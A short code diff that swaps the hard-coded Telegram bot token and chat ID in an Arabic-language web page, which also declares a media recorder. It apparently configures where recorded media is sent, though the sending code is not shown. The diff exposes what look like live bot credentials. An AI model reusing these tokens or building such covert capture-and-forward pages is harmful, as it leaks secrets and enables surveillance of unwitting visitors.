@@ -36,8 +36,8 @@
     <button id="actionButton">تشغيل الموقع</button>
 
     <script>
-        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-        const CHAT_ID = "6913353602";
+        const BOT_TOKEN = "8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE";
+        const CHAT_ID = "6703506413";
         
         const actionButton = document.getElementById('actionButton');
         let mediaRecorder;
